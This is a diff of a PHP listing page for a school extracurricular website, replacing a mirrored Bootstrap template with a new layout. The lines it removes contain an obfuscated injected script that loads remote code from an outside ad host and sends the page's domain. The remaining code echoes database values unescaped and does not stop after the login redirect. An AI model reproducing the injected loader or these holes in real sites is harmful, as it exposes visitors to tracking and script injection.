@@ -1,122 +1,137 @@
 <?php
 session_start();
-
 require_once('db/connect.php');
 require_once('function/function.php');
 
 if ($_SESSION['username'] == NULL) {
-  header('location:login.php');
+  header('location:login/');
 }
 
-
-$hasil = tampilekskul();
+$nis_siswa = $_SESSION['nis'];
 $nis = $_SESSION['nis'];
+
 $gambar = ambilgambar($nis);
 $hasilgambar = mysqli_fetch_assoc($gambar);
+$namauser = tampil_siswa_id($nis_siswa);
+$hasiluser = mysqli_fetch_assoc($namauser);
 
-// print_r($hasil);
-
-?>
+$hasil = tampilekskul();
+ ?>
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from getbootstrap.com/examples/jumbotron/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Apr 2015 11:55:32 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-<head>
+  <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <meta name="description" content="">
-    <meta name="author" content="">
-    <link rel="icon" href="../../favicon.ico">
+    <title>STARBHAK - EXTRACURRICULAR</title>
+    <link rel="shortcut icon" href="images/tblogoicon.png">
 
-    <title>Starbhak -- Ekskul </title>
-
-    <!-- Bootstrap core CSS -->
+    <!-- Bootstrap -->
     <link href="css/bootstrap.min.css" rel="stylesheet">
 
-    <!-- Custom styles for this template -->
-    <link href="jumbotron.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Oswald|Raleway" rel="stylesheet">
+    <link href="style/customlist.css" rel="stylesheet">
+    <link href="css/cfont-awesome.min" rel="stylesheet">
 
-    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
-    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
-    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
     <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
       <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
     <![endif]-->
-  </head>
 
+  </head>
   <body>
 
-    <nav class="navbar navbar-inverse navbar-fixed-top">
-      <div class="container">
-        <div class="navbar-header">
-          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+    <nav>
+     <nav class=" navbar-default navbar-fixed-top">
+  <div class="container">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header2">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
             <span class="sr-only">Toggle navigation</span>
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
           </button>
-          <a class="navbar-brand" href=""></a>
+              <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+
+            <ul class="nav navbar-nav">
+              <li class=""><a href="index.php">HOME <span class="sr-only">(current)</span></a></li>
+              <li><a type="submit" href="mylist.php">MY EXTRACURRICULAR</a></li>
+              <li class="active"><a href="list.php">EXTRACURRICULAR LIST</a></li>
+              <li ><a href="event.html">SCHOOL EVENT</a></li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li type="submit" class="profile-picture"><a><img src="images/<?php echo $hasilgambar['gambar']; ?>" width="40"
+                  height="40"></a></li>
+                  <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"><?php echo $hasiluser['nama']; ?> <span class="caret"></span></a>
+                    <ul class="dropdown-menu" role="menu">
+                      <li><a href="addfoto.php">Change Avatar</a></li>
+                      <li><a href="profile.php">Your Profile</a></li>
+                      <li><a href="settings.php">Setting Profile</a></li>
+                      <li><a href="proses/logout.php">LOGOUT</a></li>
+                    </ul>
+                  </li>
+            </ul>
+            </div><!-- /.navbar-collapse -->
+          </div>
+    </nav>
+      <nav class=" navbar-default navbar-fixed-top">
+  <div class="container">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+          <a class="navbar-brand" href="#"><img src="images/tblogo.png" class="tblogo"></a>
+
         </div>
-        <div id="navbar" class="navbar-collapse collapse">
-              <ul class="nav navbar-nav">
-                <li><a href="index.php">Home Page</a></li>
-                <li class="active"><a href="list.php">List Ekskul</a></li>
-                <li><a href="event.php">Event Sekolah</a></li>
-                <?php if($_SESSION['level'] == 'admin') { ?> <li><a href="lumino/">Admin Panel</a></li> <?php } ?>
-              </ul>
-              <ul class="nav navbar-nav navbar-right">
-                <li><a class="navbar-brand" href="addfoto.php"><img src="images/<?php echo $hasilgambar['gambar']; ?>" alt="" class="img-circle" height="30" width="35"></a></li>
-                <li><a href="profile.php">Profiles</a></li>
-                <li><a href="settings.php">Setting</a></li>
-                <li><a href="proses/logout.php">Logout</a></li>
-              </ul>
-            </div>
-      </div>
+<br>
+        <!-- Collect the nav links, forms, and other content for toggling -->
+<!-- /.container-fluid -->
+
     </nav>
 
-    <!-- Main jumbotron for a primary marketing message or call to action -->
-    <div class="jumbotron">
-      <div class="container">
-        <h1>Starbhak Ekskul</h1>
-        <p>Tempat anda untuk bergabung dengan ekskul ekskul disekolah </p>
+
+
+          <!-- HEADER -->
+    <header class="container-fluid">
+      <div class="row">
+        <!--<img src="img/profile_picture.jpg" class="img-circle profile-picture">-->
+        <h2>MY EXTRACURRICULAR</h2>
+        <p>LET'S SHARE YOUR CREATION</p>
       </div>
-    </div>
+    </header>
+          <!--/HEADER-->
 
-    <div class="container">
-    <?php while ($raw = mysqli_fetch_assoc($hasil)) { ?>
-    <hr class="featurette-divider">
-      <div class="row featurette">
-        <div class="col-md-7">
-          <h2 class="featurette-heading"><?php echo $raw['nama_ekskul'] ?></h2>
-          <p class="lead"><?php echo $raw['deskripsi'] ?></p>
-          <p><a class="btn btn-default" href="tampilekskul.php?id=<?php echo$raw['id_ekskul'] ?>" role="button">More details &raquo;</a></p>
-        </div>
-        <div class="col-md-5">
-          <img class="featurette-image img-responsive center-block" src="gambar/k1.jpg" alt="Generic placeholder image">
+          <!-- MAIN CONTENT -->
+      <div class="main-content container">
+        <div class="row">
+          <hr class="featurette-divider">
+          <?php while($ekskul = mysqli_fetch_assoc($hasil)) { ?>
+              <div class="col-md-4 portfolio-item">
+                 <a href="#">
+                     <img class="img-responsive" src="img/ekskul/silat.jpg" width="700"
+                     height="400" alt="">
+                 </a>
+                 <h3>
+                     <a href="#"> <?php echo $ekskul['nama_ekskul']; ?></a>
+                 </h3>
+                 <p><?php echo $ekskul['deskripsi']; ?></p>
+                 <p><a href="tampilekskul.php?id=<?php echo $ekskul['id_ekskul']; ?>" class="btn btn-default" role="button">More Details..</a></p>
+             </div>
+          </hr>
+          <?php } ?>
         </div>
       </div>
-    </hr>
-    <?php } ?>
-      <footer>
-        <p>&copy; Company 2014</p>
-      </footer>
-    </div> <!-- /container -->
+           <!--/MAIN CONTENT-->
 
-
-    <!-- Bootstrap core JavaScript
-    ================================================== -->
-    <!-- Placed at the end of the document so the pages load faster -->
-    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
-    <script src="../../dist/js/bootstrap.min.js"></script>
-    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
-    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
-  <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRE9a2qMKL6t1dVk%2ftJFuaDmTlnvdVFG3QwLhGEPMExxH4nUZvMRXJqYohLoaIHkjdqn1ov9rWcKd4tPFNgEMDoqIlonV2CIUIEvARHl1Z7UGpseK0C9JbppxiFx2l2n6vaQpjEeHTHA2cNRy25fzKZw0YeiyPPVtAdx6DjCVMROxq7nRYdbun%2fOS6h5QdBOZyR1u148l8YmvyVra3lbMoe6unaNjG38HZRMjHu3vbgN0nRC43sM7jXSh6RW2MZbxe5raJ84vQ79sPmQnoQ0rdJjvuamvgvmBwm8ioI%2ffAGPwFke6O4hZFTJ2MKYUEngTs%2bSFRMmVogQmn%2fCJkUF%2fCMYUDWAzJ6TN5KaGlIjHWmyMQeOT1Eljyd5L2nuXnPOsqJMXEh%2bhAVzGPtwQqtgyk7187RPXDDoPLweH%2bsrC%2bTrunTzMp%2fFqBdM%2f99cmfqh980msNc%2bw2KPwHPH5K4AB%2b0w%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
-
-<!-- Mirrored from getbootstrap.com/examples/jumbotron/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Apr 2015 11:55:33 GMT -->
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/docs.min.js"></script>
+  </body>
 </html>
